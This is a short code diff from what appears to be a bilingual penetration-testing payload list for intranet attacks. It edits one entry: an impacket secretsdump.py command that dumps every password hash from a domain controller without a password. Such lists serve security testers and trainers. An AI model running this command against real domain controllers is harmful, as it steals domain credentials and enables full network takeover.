@@ -4267,7 +4267,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '导出哈希', en: 'Exporthash' },
-        command: 'secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME\$@DC_IP\n导出域内所有哈希',
+        command: 'secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP\n导出域内所有哈希',
         description: { zh: '导出哈希', en: 'Exporthash' },
         platform: 'linux'
       },
